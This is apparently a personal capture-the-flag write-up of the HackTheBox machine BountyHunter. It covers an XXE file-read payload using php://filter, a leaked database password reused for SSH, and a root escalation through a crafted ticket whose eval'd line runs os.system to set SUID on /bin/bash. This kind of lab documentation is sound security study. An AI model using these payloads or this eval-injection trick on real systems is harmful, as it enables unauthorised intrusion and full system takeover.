# HTB - BountyHunter

---
## General Info
- OS: Linux
- Open ports: 22, 80
- Running services: SSH (8.2p1), Apache (2.4.41)
- Endpoints: 
	- /assets
		- /img
	- /resources
	- /css
	- /js
		- /scripts.js (404)
	- /css
	- /portal.php
	- /tracker_diRbPr00f314.php
- VHosts: -
- Auth: -
- Pwnd date: 07/05/2026 

---
## Enumeration  

- Ran basic enumeration steps by hand (thought [[Enum.sh]] would be overkill)
- Noticed /portal.php and /tracker_diRbPr00f314.php while navigating through the page. 
- After examinating the frontend code, it seems like portal.php has a form, that then get's translated into XML in the main js code, and through a POST request sent to /tracker_diRbPr00f314.php
- Trying XXE.
  
---
## Exploitation  

-  Well. Well. Well. I spent 1H banging my head against a wall because I wasn't encoding it correctly. Turns out that the JS code encodes in in Base64 (which I was already doing) AND encodes it to URL. For fuck's sake. [[XXE (XML External Entity Injection)|XXE]] works. I will try to read the tracker file to understand internal logic.
- I'm done of blindly enumerating by double encoding. Writing a script.
- Ok, script written. Basically, does everything I was already doing manually (craft request, base64 encode it, URL encode it, POST, then get answer) but automatically. Let's see if I find anything useful.
- Okay, I rubber ducked with Claude, and it proposed, instead of typical [[XXE (XML External Entity Injection)|XXE]], to use the following payload: `php://filter/convert.base64-encode/resource=/var/www/html/tracker_diRbPr00f314.php`
  
> Basically, this worked because when executing XXE through apache, a normal payload such as `file:///var/www/html/tracker_diRbPr00f312.php` apache tries to parse php files so it just doesn't print anything. But when sending this payload, apache doesn't get the chance to execute it because it has been encoded in base64, which allows me to read the file. 

- Retrieved source code. Reading it.

---

- At this point, I had been navigating this page for too long (about 1H). I was getting nothing out, and the php file didn't seem vulnerable to anything that could give me a foothold. I was basically banging my head against a wall. So, I went to the writeup, and once again, discovered my enumeration was trash. There was a file containing credentials, "db.php", which was empty from the outside, but the file contained credentials (something I figured out later). I will start using [dirsearch](https://github.com/maurosoria/dirsearch) instead of ffuf, or both convined, to gain more intel about the webpages I hack from here on.

## Learnt: Idk how many times I've written "enumerate better" atp.

---

- So, after retrieving /db.php, which was found after running dirsearch, I got the next answer:

```php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

- After trying to reuse credentials in SSH under the user *development* (found earlier by reading /etc/passwd), I got SSH access to the user *development*
- Got user flag. Starting PrivEsc

---
## PrivEsc

-  Ran `sudo -l`, which lists commands I can run as sudo:
```
User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```
- *Cat*ed the tickerValidator.py script to look at the code:
```python
def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
            
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():

    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")

    else:
        print("Invalid ticket.")

    ticket.close
main()
```
- I noticed that in line `validationNumber = eval(x.replace("**", ""))`, python evaluates whatever I put in validationNumber, and since this script can be as root with no password, python will evaluate whatever I pass as the validationNumber after stripping all *
- I crafted a tampered "ticket" that is the following, in order to give myself root:
 
```python
# 
Skytrain Inc
## Ticket to anywhere
__Ticket Code:__
**102+__import__('os').system('chmod +s /bin/bash')**
```
- Since all requirements from the script were met, python evaluated all logic, and made /bin/bash SUID. After executing `/bin/bash -p`, I got a bash as root.
- Got root flag.

---
## Rabbit holes

 -  Sending the wrong request repeatedly (in the Enumeration phase) and thinking that the server was sanitizing my requests.
 - Trying to read the code of the file tracker_diRbPr00f314.php, without having enumerated properly (missed db.php)

---
## Attack chain

- Enumerate the page, and find log_submit.php that POSTs XML to tracker_diRbPr00f314.php.
- Exploit [[XXE (XML External Entity Injection)|XXE]] vulnerability found in tracker_diRbPr00f314.php to read file db.php
- Retrieve credentials and reuse them in [[SSH (Secure Shell)|SSH]] to log in as user *development*
- Get user flag.
- Find root runnable script /opt/skytrain_inc/ticketValidator.py
- Understand the logic, craft a tampered ticket that makes /bin/bash SUID, and run /bin/bash to get root user.
- Get root flag.

---
## Learnt

- ALWAYS check input sent over web for codes like %2b, %3, etc. And if so use URL encoding.
- Start enumerating better.

---
## Notes  
- Machine rating: Medium/hardish (I have only seen XXE once)
  
  